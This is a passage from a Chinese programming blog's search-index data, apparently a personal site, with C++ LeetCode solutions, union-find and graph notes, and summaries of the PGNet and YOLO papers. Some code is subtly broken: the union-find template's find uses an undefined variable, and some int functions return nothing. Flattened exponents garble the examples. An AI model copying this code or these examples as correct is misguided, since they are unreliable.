2 * $10^5$ 1 &lt;&#x3D; amount_i &lt;&#x3D; $10^4$ 0 &lt;&#x3D; k &lt;&#x3D; 2 * $10^5$ 思路#include &lt;bits/stdc++.h&gt; using namespace std; class Solution &#123; public: int maxTotalFruits(vector&lt;vector&lt;int&gt;&gt; &amp;fruits, int startPos, int k) &#123; int res = 0; for (int i = 0, j = 0, sum = 0; i &lt; fruits.size(); sum -= fruits[i++][1]) &#123; while (j &lt; fruits.size() &amp;&amp; 2 * max(startPos - fruits[i][0], 0) + max(fruits[j][0] - startPos, 0) &lt;= k) &#123; res = max(res, sum += fruits[j++][1]); &#125; &#125; for (int i = 0, j = 0, sum = 0; i &lt; fruits.size(); sum -= fruits[i++][1]) &#123; while (j &lt; fruits.size() &amp;&amp; max(startPos - fruits[i][0], 0) + 2 * max(fruits[j][0] - startPos, 0) &lt;= k) &#123; res = max(res, sum += fruits[j++][1]); &#125; &#125; return res; &#125; &#125;;","categories":[{"name":"每日一题","slug":"每日一题","permalink":"https://dfsgwb.github.io/categories/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://dfsgwb.github.io/tags/C/"},{"name":"ACM","slug":"ACM","permalink":"https://dfsgwb.github.io/tags/ACM/"},{"name":"刷题","slug":"刷题","permalink":"https://dfsgwb.github.io/tags/%E5%88%B7%E9%A2%98/"},{"name":"leetcode","slug":"leetcode","permalink":"https://dfsgwb.github.io/tags/leetcode/"}]},{"title":"leetcode 970","slug":"leetcode970","date":"2023-05-02T07:12:30.000Z","updated":"2023-05-02T07:16:47.566Z","comments":true,"path":"2023/05/02/leetcode970/","link":"","permalink":"https://dfsgwb.github.io/2023/05/02/leetcode970/","excerpt":"","text":"题目： 给定三个整数x 、y和bound,返回值小于或等于bound的所有强整数 组成的列表 。如果某一整数可以表示为 $x^i + y^j$ ，其中整数 i &gt;&#x3D; 0 且 j &gt;&#x3D; 0，那么我们认为该整数是一个 强整数 。你可以按任何顺序返回答案。在你的回答中，每个值 最多 出现一次。 输入输出示例1： 输入：x &#x3D; 2, y &#x3D; 3, bound &#x3D; 10输出：[2,3,4,5,7,9,10]解释：2 &#x3D; 20 + 303 &#x3D; 21 + 304 &#x3D; 20 + 315 &#x3D; 21 + 317 &#x3D; 22 + 319 &#x3D; 23 + 3010 &#x3D; 20 + 32 示例2: 输入：x &#x3D; 3, y &#x3D; 5, bound &#x3D; 15输出：[2,4,6,8,10,14] 提示： 1 &lt;&#x3D; x, y &lt;&#x3D; 100 0 &lt;&#x3D; bound &lt;&#x3D; $10^6$ 思路#include &lt;bits/stdc++.h&gt; using namespace std; //使用set暴力循环 class Solution &#123; public: vector&lt;int&gt; powerfulIntegers(int x, int y, int bound) &#123; vector&lt;int&gt; ans; unordered_set&lt;int&gt; res; for (int i = 1; i &lt;= bound; i *= x) &#123; for (int j = 1; j + i &lt;= bound; j *= y) &#123; res.insert(i + j); if (y == 1) break; &#125; if (x == 1) break; &#125; for (int x : res) ans.push_back(x); sort(ans.begin(), ans.end()); return ans; &#125; &#125;","categories":[{"name":"每日一题","slug":"每日一题","permalink":"https://dfsgwb.github.io/categories/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://dfsgwb.github.io/tags/C/"},{"name":"ACM","slug":"ACM","permalink":"https://dfsgwb.github.io/tags/ACM/"},{"name":"刷题","slug":"刷题","permalink":"https://dfsgwb.github.io/tags/%E5%88%B7%E9%A2%98/"},{"name":"leetcode","slug":"leetcode","permalink":"https://dfsgwb.github.io/tags/leetcode/"}]},{"title":"leetcode 1048","slug":"leetcode1048","date":"2023-04-27T09:16:12.000Z","updated":"2023-04-27T09:22:03.912Z","comments":true,"path":"2023/04/27/leetcode1048/","link":"","permalink":"https://dfsgwb.github.io/2023/04/27/leetcode1048/","excerpt":"","text":"题目： 给出一个单词数组 words ，其中每个单词都由小写英文字母组成，如果我们可以不改变其他字符的顺序 ，在wordA 的任何地方添加 恰好一个 字母使其变成wordB，那么我们认为wordA是wordB的前身。例如”abc”是”abac”的前身，而”cba”不是”bcad”的前身。词链式单词[word_1,word_2, …, word_k]组成的序列，k&gt;&#x3D;1，其中word1是word2的前身，word2是word3的前身，依此类推。一个单词通常是k&#x3D;&#x3D;1的单词链，从给定单词列表words中选择单词组成词链，返回词链的最长可能长度 输入输出示例1： 输入：words &#x3D; [“a”,”b”,”ba”,”bca”,”bda”,”bdca”]输出：4解释：最长单词链之一为 [“a”,”ba”,”bda”,”bdca”] 示例2: 输入：words &#x3D; [“xbc”,”pcxbcf”,”xb”,”cxbc”,”pcxbc”]输出：5解释：所有的单词都可以放入单词链 [“xb”, “xbc”, “cxbc”, “pcxbc”, “pcxbcf”]. 示例3: 输入：words &#x3D; [“abcd”,”dbqca”]输出：1解释：字链[“abcd”]是最长的字链之一。[“abcd”，”dbqca”]不是一个有效的单词链，因为字母的顺序被改变了。 提示： 1 &lt;&#x3D; words.length &lt;&#x3D; 1000 1 &lt;&#x3D; words[i].length &lt;&#x3D; 16 words[i] 仅由小写英文字母组成 思路#include &lt;bits/stdc++.h&gt; using namespace std; class Solution &#123; public: int longestStrChain(vector&lt;string&gt; &amp;words) &#123; // 首先对words进行排个序，按照长度排序 sort(words.begin(), words.end(), [](const auto &amp;a, const auto &amp;b) &#123; return a.length() &lt; b.length(); &#125;); int ans = 0; unordered_map&lt;string, int&gt; mp; for (auto &amp;s : words) &#123; int res = 0; for (int i = 0; i &lt; s.length(); ++i) &#123; auto it = mp.find(s.substr(0, i) + s.substr(i + 1)); if (it != mp.end()) &#123; res = max(res, it-&gt;second); &#125; &#125; ans = max(ans, mp[s] = res + 1); &#125; return ans; &#125; &#125;;","categories":[{"name":"每日一题","slug":"每日一题","permalink":"https://dfsgwb.github.io/categories/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://dfsgwb.github.io/tags/C/"},{"name":"ACM","slug":"ACM","permalink":"https://dfsgwb.github.io/tags/ACM/"},{"name":"刷题","slug":"刷题","permalink":"https://dfsgwb.github.io/tags/%E5%88%B7%E9%A2%98/"},{"name":"leetcode","slug":"leetcode","permalink":"https://dfsgwb.github.io/tags/leetcode/"}]},{"title":"leetcode 1003","slug":"leetcode1003","date":"2023-04-26T01:23:20.000Z","updated":"2023-05-03T01:43:38.845Z","comments":true,"path":"2023/04/26/leetcode1003/","link":"","permalink":"https://dfsgwb.github.io/2023/04/26/leetcode1003/","excerpt":"","text":"题目： 给你一个字符串s，请你判断它是否有效。字符串s有效需要满足：假设开始有一个空字符串t&#x3D;””，你可以执行任意次下述操作将t转换为s：将字符串 “abc” 插入到 t 中的任意位置。形式上，t 变为$t_{left} + “abc” + t_{right}$，其中 $t &#x3D;&#x3D; t_{left} + t_{right}$ 。注意，$t_{right}$和$t_{left}$ 可能为空 。如果字符串 s 有效，则返回 true；否则，返回 false。 输入输出示例1： 输入：s &#x3D; “aabcbc”输出：true解释：”” -&gt; “abc” -&gt; “aabcbc”因此，”aabcbc” 有效。。 示例2: 输入：s &#x3D; “abcabcababcc”输出：true解释：”” -&gt; “abc” -&gt; “abcabc” -&gt; “abcabcabc” -&gt; “abcabcababcc”因此，”abcabcababcc” 有效。 示例3: 输入：s &#x3D; “abccba”输出：false解释：执行操作无法得到 “abccba” 。 提示： 1 &lt;&#x3D; s.length &lt;&#x3D; $2 \\times 10^4$ s 由字母 ‘a’、’b’ 和 ‘c’ 组成 思路一次遍历使用一个栈 当遇到字符a时,直接入栈 当遇到字符b时，检查栈顶是否为字符a ,如果是将b入栈，如果不是返回false； 当遇到字符c时，检查栈顶是否为字符b,如果是将c入栈,（再将栈顶的cba弹出）如果不是返回false 最后判断栈是否为空即可 #include &lt;bits/stdc++.h&gt; using namespace std; class Solution &#123; public: bool isValid(string s) &#123; stack&lt;char&gt; st; int n = s.size(); for (int i = 0; i &lt; n; i++) &#123; if (s[i] == &#39;b&#39; &amp;&amp; (st.empty() || (!st.empty() &amp;&amp; st.top() != &#39;a&#39;))) return false; else if (s[i] == &#39;c&#39; &amp;&amp; (st.empty() || (!st.empty() &amp;&amp; st.top() != &#39;b&#39;))) return false; st.push(s[i]); if (s[i] == &#39;c&#39;) &#123; st.pop(); st.pop(); st.pop(); &#125; &#125; return st.empty(); &#125; &#125;;","categories":[{"name":"每日一题","slug":"每日一题","permalink":"https://dfsgwb.github.io/categories/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://dfsgwb.github.io/tags/C/"},{"name":"ACM","slug":"ACM","permalink":"https://dfsgwb.github.io/tags/ACM/"},{"name":"刷题","slug":"刷题","permalink":"https://dfsgwb.github.io/tags/%E5%88%B7%E9%A2%98/"},{"name":"leetcode","slug":"leetcode","permalink":"https://dfsgwb.github.io/tags/leetcode/"}]},{"title":"leetcode 1031","slug":"leetcode1031","date":"2023-04-25T12:43:20.000Z","updated":"2023-04-26T02:32:52.007Z","comments":true,"path":"2023/04/25/leetcode1031/","link":"","permalink":"https://dfsgwb.github.io/2023/04/25/leetcode1031/","excerpt":"","text":"题目： 给你一个整数数组 nums 和两个整数 firstLen 和 secondLen，请你找出并返回两个非重叠 子数组 中元素的最大和，长度分别为 firstLen 和 secondLen.长度为 firstLen 的子数组可以出现在长为 secondLen 的子数组之前或之后，但二者必须是不重叠的。子数组是数组的一个 连续 部分。 输入输出示例1： 输入：nums&#x3D;[0,6,5,2,2,5,1,9,4], firstLen&#x3D;1, secondLen&#x3D;2输出：20解释：子数组的一种选择中，[9]长度为1，[6,5]长度为2。 示例2: 输入：nums&#x3D;[3,8,1,3,2,1,8,9,0], firstLen&#x3D;3, secondLen&#x3D;2输出：29解释：子数组的一种选择中，[3,8,1]长度为3，[8,9]长度为 2。 示例3: 输入：nums&#x3D;[2,1,5,6,0,9,5,0,3,8], firstLen &#x3D; 4, secondLen &#x3D; 3输出：31解释：子数组的一种选择中[5,6,0,9]长度为 4，[0,3,8]长度为 3。 提示： 1 &lt;&#x3D; firstLen, secondLen &lt;&#x3D; 1000 2 &lt;&#x3D; firstLen + secondLen &lt;&#x3D; 1000 firstLen + secondLen &lt;&#x3D; nums.length &lt;&#x3D; 1000 0 &lt;&#x3D; nums[i] &lt;&#x3D; 1000 思路前置知识：前缀和 但对于数组$nums$，定义前缀和$S[0]&#x3D;0,S[i+1]&#x3D;\\sum\\limits_{j&#x3D;0}^i nums[j]$,由此不难得出$S[i+1]&#x3D;S[i]+nums[i]$。 通过前缀和我们可以把子数组的元素和转化为两个前缀和的差，也就是$$\\sum\\limits_{j&#x3D;left}^{right}nums[j]&#x3D;\\sum\\limits_{j&#x3D;0}^{right}nums[j]-\\sum\\limits_{j&#x3D;0}^{left-1}nums[j]&#x3D;S[right+1]-S[left]$$ 解决思路：设长度为firstLen的子数组为a，长度为secondLen的子数组为b，先解决左a右b的情况，然后同理处理右a左b的情况。 代码实现 #include &lt;bits/stdc++.h&gt; using namespace std; class Solution &#123; public: int maxSumTwoNoOverlap(vector&lt;int&gt; &amp;nums, int firstLen, int secondLen) &#123; int n = nums.size(), ans = 0, s[n + 1]; s[0] = 0; // 计算nums的前缀和 partial_sum(nums.begin(), nums.end(), s + 1); int maxnumA = 0, maxnumB = 0; for (int i = firstLen + secondLen; i &lt;= n; i++) &#123; maxnumA = max(maxnumA, s[i - secondLen] - s[i - secondLen - firstLen]); maxnumB = max(maxnumB, s[i - firstLen] - s[i - firstLen - secondLen]); ans = max(ans, max(maxnumA + s[i] - s[i - secondLen], maxnumB + s[i] - s[i - firstLen])); &#125; return ans; &#125; &#125;;","categories":[{"name":"每日一题","slug":"每日一题","permalink":"https://dfsgwb.github.io/categories/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://dfsgwb.github.io/tags/C/"},{"name":"ACM","slug":"ACM","permalink":"https://dfsgwb.github.io/tags/ACM/"},{"name":"刷题","slug":"刷题","permalink":"https://dfsgwb.github.io/tags/%E5%88%B7%E9%A2%98/"},{"name":"leetcode","slug":"leetcode","permalink":"https://dfsgwb.github.io/tags/leetcode/"}]},{"title":"leetcode 2418","slug":"leetcode2418","date":"2023-04-25T12:43:20.000Z","updated":"2023-04-26T02:34:21.365Z","comments":true,"path":"2023/04/25/leetcode2418/","link":"","permalink":"https://dfsgwb.github.io/2023/04/25/leetcode2418/","excerpt":"","text":"题目： 给你一个字符串数组 names ，和一个由 互不相同 的正整数组成的数组 heights 。两个数组的长度均为 n 。对于每个下标 i，names[i] 和 heights[i] 表示第 i 个人的名字和身高。请按身高 降序 顺序返回对应的名字数组 names 。 输入输出示例1： 输入：names &#x3D; [“Mary”,”John”,”Emma”], heights &#x3D; [180,165,170]输出：[“Mary”,”Emma”,”John”]解释：Mary 最高，接着是 Emma 和 John 。 示例2: 输入：names &#x3D; [“Alice”,”Bob”,”Bob”], heights &#x3D; [155,185,150]输出：[“Bob”,”Alice”,”Bob”]解释：第一个 Bob 最高，然后是 Alice 和第二个 Bob 。 提示： n &#x3D;&#x3D; names.length &#x3D;&#x3D; heights.length 1 &lt;&#x3D; n &lt;&#x3D; 103 1 &lt;&#x3D; names[i].length &lt;&#x3D; 20 1 &lt;&#x3D; heights[i] &lt;&#x3D; 105 names[i] 由大小写英文字母组成 heights 中的所有值互不相同 解决方法#include &lt;bits/stdc++.h&gt; using namespace std; class Solution &#123; struct compare &#123; bool operator()(const int &amp;a, const int &amp;b) const &#123; return a &gt; b; &#125; &#125;; public: vector&lt;string&gt; sortPeople(vector&lt;string&gt; &amp;names, vector&lt;int&gt; &amp;heights) &#123; map&lt;int, string, compare&gt; mp; for (int i = 0; i &lt; names.size(); i++) &#123; mp.insert(make_pair(heights[i], names[i])); &#125; vector&lt;string&gt; ans; for (auto &amp;num : mp) &#123; ans.push_back(num.second); &#125; return ans; &#125; &#125;;","categories":[{"name":"每日一题","slug":"每日一题","permalink":"https://dfsgwb.github.io/categories/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://dfsgwb.github.io/tags/C/"},{"name":"ACM","slug":"ACM","permalink":"https://dfsgwb.github.io/tags/ACM/"},{"name":"刷题","slug":"刷题","permalink":"https://dfsgwb.github.io/tags/%E5%88%B7%E9%A2%98/"},{"name":"leetcode","slug":"leetcode","permalink":"https://dfsgwb.github.io/tags/leetcode/"}]},{"title":"Pyramid Grafting Network for One-Stage High Resolution Saliency Detection","slug":"PGNet","date":"2023-04-18T08:29:57.000Z","updated":"2023-04-18T09:22:33.270Z","comments":true,"path":"2023/04/18/PGNet/","link":"","permalink":"https://dfsgwb.github.io/2023/04/18/PGNet/","excerpt":"","text":"摘要由于采样深度和感受野大小之间的矛盾，大多数根据低分辨输入设计的SOD模型在高分辨率图像中表现不佳，本文提出一种金字塔嫁接网络。使用transformer和CNN主干分别从不同分辨率的图像中提取特征，然后将特征从transformer分支嫁接到CNN分支，与此同时提出一种基于注意的分叉模型嫁接模块，使CNN分支能够在解码过程中，在不同信源特征的引导下，更全面地组合破碎的细节信息，此外还设计了一个注意引导丢失来明确监督交叉嫁接模块生成注意矩阵，以帮助网络更好地与来自不同模型的注意进行交互。 困境当前主流的SOD模型遇到高分辨率的图像，为了减少内存的开销往往会将图像先下采样然后对输出结果上采样已恢复原始分辨率，由于现在的SOD模型都是使用编码器-解码器的方式设计的，随着分辨率的大幅度提高，提取的特征大小会增加，但是网络的感受野是固定的，使得相对感受野变小，最终导致无法捕获对任务至关重要的全局语义。 目前对于高分辨率SOD方法有两种主流：HRSOD和DHQSOD，其中HRSOD将整个过程分为全局阶段，局部阶段和重组阶段，全局阶段为局部阶段和作物过程提供指导。DHSOD将SOD任务分解为分类任务和回归任务，这两个任务通过他们提出的trimap和不确定性损失连接起来，它们生成具有清晰边界的相对较好的显著性贴图。但是这两者都是使用多阶段架构，将SOD分为语义(低分辨率)和细节(高分辨率)两个阶段。由此引出两个问题： 阶段间语境语义迁移不一致，在前一个阶段获得的中间映射被输入到最后一个阶段，同时错误也被传递，由此后续细化阶段可能将继续放大错误 耗时，与单阶段相比，多阶段方法不仅难以并行且参数过多，模型运行运行速度较慢 高分辨率SDO发展Zeng等人Towards High-Resolution Salient Object Detection提出了一种高分辨率显著目标检测范式，使用GSN提取语义信息，使用APS引导的LRN优化局部细节，最后使用GLFN进行预测融合。他们还提供了第一个高分辨率显著目标检测数据集（HRSOD）。Tang等人Disentangled high quality salient object detection提出，显著目标检测应分为两项任务。他们首先设计LRSCN以在低分辨率下捕获足够的语义并生成trimap。通过引入不确定性损失，所设计的HRRN可以对第一阶段使用低分辨率数据集生成的trimap进行细化。然而，它们都使用多级体系结构，这导致推理速度较慢，难以满足某些实际应用场景。更严重的问题是网络之间的语义不一致。 使用常用的SOD数据集通常分辨率较低，用他们来训练高分辨率网络和评估高质量分割存在以下几点缺点: 图像分辨率低导致细节不足 注释边缘的质量较差 注释的更加精细级别不够令人满意 当前可用的高分辨率数据集是HRSOD，但是HRSOD数据集图像数量有限,严重影响模型的泛化能力。 Staggered Grafting Framework网络框架如图所示： 由两个编码器和一个解码器构成，使用Swim transformer和ResNet18作为编码器，transformer编码器能够在低分辨率情况下获得准确的全局语义信息，卷积编码器能够在高分辨率输入下获得丰富的细节信息，不同模型之间的提取的特征可能是互补的，可以获得更多的有效特征。 在编码的过程中，向两个编码器馈送不同分辨率的图像，并行获取全局语义信息和详细信息。解码分为三个过程，一个是Swim解码，一个是嫁接编码，最后是交错结构的ResNet解码，在第二个子阶段的解码特征是从跨模态移植模块产生的，其中全局语义信息从Swin分支移植到ResNet分支，跨模态移植模块还会处理一个名为CAM的矩阵进行监督 交叉模型迁移模块(CMGM)作用：移植由两个编码器提取的特征，对于transformer所提取的特征$f_{S_2}$能够远距离捕获信息，具有全局语义信息。使用ResNet所得到的$f_{R_5}$有更好的局部信息，也就是更丰富的细节信息。但是由于特征大小和感受野之间的差异，在$f_{R_5}$中有更多的噪声。 使用常见的融合方法：如逐元素相加和相乘的适用情况限制在显著预测和不同特征生成的预测至少有一部分是对的情况下，否则就是一种错误的适用方式，且这种操作都只关注于有限的局部信息，导致没法实现自我纠错。 作者提出使用CMGM重新计算ResNet特征和Transformer特征之间的逐点关系，将全局语义信息通过transformer分支转移到ResNet分支，从而弥补常见的错误，通过计算$E&#x3D;|G-P| \\in [0,1]$得到误差图 CMGM纠错效果图 CMGM网络结构 实验结果 可视化 关于MSELoss、BCELoss、CELoss损失函数求导的推导损失函数","categories":[{"name":"SOD","slug":"SOD","permalink":"https://dfsgwb.github.io/categories/SOD/"}],"tags":[{"name":"SOD","slug":"SOD","permalink":"https://dfsgwb.github.io/tags/SOD/"},{"name":"深度学习","slug":"深度学习","permalink":"https://dfsgwb.github.io/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"High-Resolution Vision","slug":"High-Resolution-Vision","permalink":"https://dfsgwb.github.io/tags/High-Resolution-Vision/"}]},{"title":"Yolov1","slug":"YoLov1","date":"2023-04-16T08:45:37.000Z","updated":"2023-04-16T09:20:22.865Z","comments":true,"path":"2023/04/16/YoLov1/","link":"","permalink":"https://dfsgwb.github.io/2023/04/16/YoLov1/","excerpt":"","text":"背景目前物体检测算法有以下三种： 1.传统物体检测算法，使用人工设计特征以及机器学习的分类方式，但这种算法提取到的特征局限性较大且学习速度有限； 2.结合候选框+深度学习分类法，这类Two-Stage方法解决了前者的问题，在精度上有很大突破，但在速度上很难达到实时检测的效果； 3.基于深度学习的回归方法，在速度上达到了实时级别的突破，本文使用YOLO就是属于One-stage，YOLO虽然在v1,v2版本准确率上有所欠缺，但到v5版本时准确率提高了很多。 Yolo简介 ① YOLO的全称是you only look once，指只需要浏览一次就可以识别出图中的物体的类别和位置。② YOLO是目标检测模型。目标检测是计算机视觉中比较简单的任务，用来在一张图篇中找到某些特定的物体，目标检测不仅要求我们识别这些物体的种类，同时要求我们标出这些物体的位置。③ YOLO能实现图像或视频中物体的快速识别，在相同的识别类别范围和识别准确率条件下，YOLO识别速度最快。YOLO有多种模型 yolov1算法流程： 1.将输入图像缩放到$448\\times448\\times3$大小 2.经过卷积网络backbone提取特征图 3.把提取到的特征图输入到两层全连接层，最终输出$7\\times7\\times30$大小的特征图 检测方法： 1.将输入图像划分成S*S的网格，如果物体中心落入某个网格内，就由该网格单元负责检测该目标。 2.每个网格预测B个边界框和它们的置信度，置信度是预测框和真实物体IOU和网格是否包含物体01值之积 3.每个边界框都包含5个预测值，x,y,w,h,confidence，分别代表中心坐标，宽高和IOU值，这里的坐标是相对于网格左上角的偏移量，宽高是相对于整幅图像的占比 架构设计网络前面的卷积层用于从图像中提取特征，全连接层用于预测输出概率和坐标，共有24个卷积层，2个全连接层。 Training设计使用ImageNet分类数据先做预训练，预训练使用的网络为Fig 3中的前20层卷积，再加一个average-pooling层和全连接层。预训练好以后，再加4层卷积和2层全连接(随机初始化权重)去训练检测任务，输入大小为448×448,预训练分类时使用的是224×224。最后一层会同时输出类别概率和box的坐标，利用图像的宽和高对box的宽和高做归一化，使其介于0和1之间。将box的x和y坐标参数化为特定网格单元位置的偏移量，因此它们也在0和1之间。对最后一层使用线性激活函数，其他层均使用leaky ReLU。 优化模型输出的sum-squared error，是因为它很容易优化，但并不完全符合最大化average precision的目标。它将定位误差与分类误差同等加权，这可能并不理想。此外，图像中会有很多网格不包含任何目标，这些网格的confidence score为0，这通常会overpower确实包含目标的网格的梯度。这会导致模型不稳定，出现发散。为了解决这个问题，增加了bounding box坐标预测的损失，减小了不包含目标的box的confidence预测的损失，使用参数 $\\lambda_{coord}(&#x3D;5),\\lambda_{noobj}(&#x3D;0.5)$来完成 sum-squared error对大box和小box也是同等加权的，一个好的误差度量应该能反映出small box中的小偏差比large box的小偏差更重要。为了解决这个问题，使用bounding box的宽和高的平方根来计算，而不是宽和高本身。YOLO对每个网格单元会预测多个bounding boxes。在训练时，我们希望对每个目标只有一个bounding box预测器对其负责。会分配一个预测器来负责预测一个目标，基于它的预测与ground truth有最高的IOU。 YOLOV1优点 ①快。因为回归问题没有复杂的流程（pipeline）。②可以基于整幅图像预测（看全貌而不是只看部分）。与基于滑动窗口和区域提议的技术不同，YOLO在训练和测试期间会看到整个图像，因此它隐式地编码有关类及其外观的上下文信息。因为能看到图像全貌，与 Fast R-CNN 相比，YOLO 预测背景出错的次数少了一半。③学习到物体的通用表示（generalizable representations），泛化能力好。因此，当训练集和测试集类型不同时，YOLO 的表现比 DPM 和 R-CNN 好得多，应用于新领域也很少出现崩溃的情况。 YOLOV1缺点 ① 空间限制：一个单元格只能预测两个框和一个类别，这种空间约束必然会限制预测的数量；② 难扩展：模型根据数据预测边界框，很难将其推广到具有新的或不同寻常的宽高比或配置的对象。由于输出层为全连接层，因此在检测时，YOLO 训练模型只支持与训练图像相同的输入分辨率。③ 网络损失不具体：无论边界框的大小都用损失函数近似为检测性能，物体 IOU 误差和小物体 IOU 误差对网络训练中 loss 贡献值接近，但对于大边界框来说，小损失影响不大，对于小边界框，小错误对 IOU 影响较大，从而降低了物体检测的定位准确性。","categories":[{"name":"人工智能","slug":"人工智能","permalink":"https://dfsgwb.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"}],"tags":[{"name":"深度学习","slug":"深度学习","permalink":"https://dfsgwb.github.io/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"Yolo","slug":"Yolo","permalink":"https://dfsgwb.github.io/tags/Yolo/"},{"name":"Detection","slug":"Detection","permalink":"https://dfsgwb.github.io/tags/Detection/"}]},{"title":"Yolov2","slug":"Yolov2","date":"2023-04-16T08:45:37.000Z","updated":"2023-04-16T08:52:20.940Z","comments":true,"path":"2023/04/16/Yolov2/","link":"","permalink":"https://dfsgwb.github.io/2023/04/16/Yolov2/","excerpt":"","text":"背景由于YOLOv1存在定位不准确以及与two-stage方法相比召回率低的缺点，作者于2017年提出了YOLOv2算法。在论文中作者提出了从更准确，更快，更多识别三个角度对YOLOv1算法进行了改进，其中识别更多对象也就是扩展到能检测9000种不同对象，被称为YOLO9000。","categories":[{"name":"人工智能","slug":"人工智能","permalink":"https://dfsgwb.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"}],"tags":[{"name":"深度学习","slug":"深度学习","permalink":"https://dfsgwb.github.io/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"Yolo","slug":"Yolo","permalink":"https://dfsgwb.github.io/tags/Yolo/"},{"name":"Detection","slug":"Detection","permalink":"https://dfsgwb.github.io/tags/Detection/"}]},{"title":"图的有趣性质(一)","slug":"图1","date":"2023-04-16T02:47:51.000Z","updated":"2023-04-16T09:20:18.465Z","comments":true,"path":"2023/04/16/图1/","link":"","permalink":"https://dfsgwb.github.io/2023/04/16/%E5%9B%BE1/","excerpt":"","text":"题目小朋友 A 在和 ta 的小伙伴们玩传信息游戏，游戏规则如下： 1.有 n 名玩家，所有玩家编号分别为 0 ～ n-1，其中小朋友 A 的编号为 02.每个玩家都有固定的若干个可传信息的其他玩家（也可能没有）。传信息的关系是单向的（比如 A 可以向 B 传信息，但 B 不能向 A 传信息）。每轮信息必须需要传递给另一个人，且信息可重复经过同一个人 给定总玩家数 n，以及按[玩家编号,对应可传递玩家编号]关系组成的二维数组 relation。返回信息从小 A (编号 0 ) 经过 k 轮传递到编号为 n-1 的小伙伴处的方案数；若不能到达，返回 0 输入 输入：n &#x3D; 5, relation &#x3D; [[0,2],[2,1],[3,4],[2,3],[1,4],[2,0],[0,4]], k &#x3D; 3输出：3解释：信息从小 A 编号 0 处开始，经 3 轮传递，到达编号 4。共有 3 种方案，分别是 0-&gt;2-&gt;0-&gt;4， 0-&gt;2-&gt;1-&gt;4， 0-&gt;2-&gt;3-&gt;4。 思路一：一眼DFS或者BFS即可 class Solution &#123; public: int ans=0; void dfs(vector&lt;vector&lt;int&gt;&gt;&amp; relation, int start, int step, int k, int n) &#123; if(step==k)&#123; if(start==n-1)&#123; ans++; &#125; return ; &#125; for(int i = 0; i &lt; relation.size(); i++)&#123; if(relation[i][0] == start) dfs(relation, relation[i][1], step+1, k, n); &#125; &#125; int numWays(int n, vector&lt;vector&lt;int&gt;&gt;&amp; relation, int k) &#123; for(int i=0;i&lt;relation.size();i++)&#123; if(relation[i][0]==0) dfs(relation, relation[i][1], 1, k, n); &#125; return ans; &#125; &#125;; 思路二在图中有一种有趣的性质，当我们使用01的邻接矩阵表示图中边集的连通性时，使用领接矩阵乘以邻接矩阵得到的新矩阵中的[i][j]表示的就是从i-&gt;j的路线数量 class Solution &#123; public: int N; vector&lt;vector&lt;int&gt;&gt;A, A0; void func() &#123; vector&lt;vector&lt;int&gt;&gt;vt(N, vector&lt;int&gt;(N,0)); for(int i=0;i&lt;N;++i)&#123; for(int j=0;j&lt;N;++j)&#123; for(int k=0;k&lt;N;k++)&#123; vt[i][j]+=A[i][k]*A0[k][j]; &#125; &#125; &#125; A = vt; &#125; int numWays(int n, vector&lt;vector&lt;int&gt;&gt;&amp; relation, int k) &#123; N = n; A0.resize(n,vector&lt;int&gt;(n,0)); for(auto&amp; vt : relation )&#123; A0[vt[0]][vt[1]] = 1; &#125; A= A0; for(int i=1;i&lt;k;++i)&#123; func(); &#125; return A[0][n-1]; &#125; &#125;;","categories":[{"name":"c++","slug":"c","permalink":"https://dfsgwb.github.io/categories/c/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://dfsgwb.github.io/tags/C/"},{"name":"ACM","slug":"ACM","permalink":"https://dfsgwb.github.io/tags/ACM/"},{"name":"刷题","slug":"刷题","permalink":"https://dfsgwb.github.io/tags/%E5%88%B7%E9%A2%98/"},{"name":"图","slug":"图","permalink":"https://dfsgwb.github.io/tags/%E5%9B%BE/"}]},{"title":"并查集","slug":"并查集","date":"2023-04-16T02:47:51.000Z","updated":"2023-04-16T07:51:07.961Z","comments":true,"path":"2023/04/16/并查集/","link":"","permalink":"https://dfsgwb.github.io/2023/04/16/%E5%B9%B6%E6%9F%A5%E9%9B%86/","excerpt":"","text":"概念并查集是一种树型的数据结构，用于处理一些不相交集合的合并及查询问题（即所谓的并、查）。比如说，我们可以用并查集来判断一个森林中有几棵树、某个节点是否属于某棵树等。并查集（Union-Find）就是用来对集合进行 合并（Union） 与 查询（Find） 操作的一种数据结构。 合并 就是将两个不相交的集合合并成一个集合。查询 就是查询两个元素是否属于同一集合。 简易版并查集模板 int n=1001;//定义节点数量 int father[1001] //初始化并查集 int init()&#123; for(int i=0;i&lt;n;i++)&#123; father[i]=i; &#125; &#125; //并查集查找根 int find(int x)&#123; return u==father[u]?u:father[u]=find(father[u]);//压缩路径 &#125; //将v-&gt;u这条边添加到并查集中 int merge(int u,int v)&#123; u=find(u); v=find(v); if(u==v) return; father[v]=u; &#125; //在减少find函数迭代次数的情况，优化加边的操作就会变成将小集合连接到大集合上 int merge_2(int u,int v)&#123; u=find(u); v=find(v); if(u==v) return ; if(size[u]&lt;size[v]) father[u]=v; else father[v]=u; &#125; //判断u和v是否是在一个根下 int same(int u,int v)&#123; u=find(u); v=find(v); return u==v; &#125; 带权并查集在一般的并查集的基础上，在每条边中记录额外的信息 int n=1001;//定义节点数量 int father[1001]; int value[1001]; //初始化并查集 int init()&#123; for(int i=0;i&lt;n;i++)&#123; father[i]=i; &#125; &#125; //并查集查找根 int find(int x)&#123; if(x!=father[x])&#123; int t=father[x]; father[x]=find(father[x]); value[x]+=value[t]; &#125; return father[x]; &#125; 